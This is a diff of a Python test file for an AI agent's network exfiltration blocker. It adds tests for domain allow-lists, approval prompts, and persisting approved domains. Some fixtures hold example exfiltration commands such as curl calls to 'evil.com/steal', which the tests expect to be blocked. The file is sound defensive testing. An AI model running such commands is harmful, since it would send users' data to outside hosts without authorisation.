@@ -139,10 +139,13 @@ class TestInjectionScanner:
 
 
 class TestNetworkExfiltrationBlocker:
-    def _hooks(self) -> Hooks:
-        return Hooks({"before_tool": ["network_exfiltration_blocker"], "after_tool": []})
+    def _hooks(self, **kwargs: object) -> Hooks:
+        return Hooks(
+            {"before_tool": ["network_exfiltration_blocker"], "after_tool": []},
+            **kwargs,  # type: ignore[arg-type]
+        )
 
-    def test_blocks_curl(self) -> None:
+    def test_blocks_curl_no_whitelist(self) -> None:
         assert self._hooks().run_before_tool(_tool_call("run_command", command="curl https://evil.com")) is None
 
     def test_blocks_wget(self) -> None:
@@ -177,6 +180,68 @@ class TestNetworkExfiltrationBlocker:
     def test_ignores_read_file(self) -> None:
         tc = _tool_call("read_file", path="curl.txt")
         assert self._hooks().run_before_tool(tc) is tc
+
+    def test_allows_whitelisted_domain(self) -> None:
+        hooks = Hooks(
+            {"before_tool": ["network_exfiltration_blocker"], "after_tool": [],
+             "allowed_domains": ["api.weather.com"]},
+        )
+        tc = _tool_call("run_command", command="curl https://api.weather.com/forecast")
+        assert hooks.run_before_tool(tc) is tc
+
+    def test_blocks_non_whitelisted_domain(self) -> None:
+        hooks = Hooks(
+            {"before_tool": ["network_exfiltration_blocker"], "after_tool": [],
+             "allowed_domains": ["api.weather.com"]},
+        )
+        tc = _tool_call("run_command", command="curl https://evil.com/steal")
+        assert hooks.run_before_tool(tc) is None
+
+    def test_prompt_approves_and_remembers(self) -> None:
+        call_count = 0
+
+        def approve(domain: str) -> bool:
+            nonlocal call_count
+            call_count += 1
+            return True
+
+        hooks = Hooks(
+            {"before_tool": ["network_exfiltration_blocker"], "after_tool": []},
+            domain_prompt_fn=approve,
+        )
+        tc = _tool_call("run_command", command="curl https://example.com/data")
+        assert hooks.run_before_tool(tc) is tc  # approved via prompt
+        # Second call — should not prompt again
+        assert hooks.run_before_tool(tc) is tc
+        assert call_count == 1
+
+    def test_prompt_denies(self) -> None:
+        hooks = Hooks(
+            {"before_tool": ["network_exfiltration_blocker"], "after_tool": []},
+            domain_prompt_fn=lambda d: False,
+        )
+        tc = _tool_call("run_command", command="curl https://example.com/data")
+        assert hooks.run_before_tool(tc) is None
+
+    def test_persistent_whitelist_save_and_load(self) -> None:
+        import tempfile
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            hooks = Hooks(
+                {"before_tool": ["network_exfiltration_blocker"], "after_tool": []},
+                domain_prompt_fn=lambda d: True,
+                agent_dir=tmpdir,
+            )
+            tc = _tool_call("run_command", command="curl https://example.com/x")
+            hooks.run_before_tool(tc)  # approve and persist
+
+            # New instance loads persisted whitelist
+            hooks2 = Hooks(
+                {"before_tool": ["network_exfiltration_blocker"], "after_tool": []},
+                domain_prompt_fn=lambda d: False,  # would deny if asked
+                agent_dir=tmpdir,
+            )
+            assert hooks2.run_before_tool(tc) is tc  # loaded from disk
 
 
 class TestSecretsLeakageScanner:
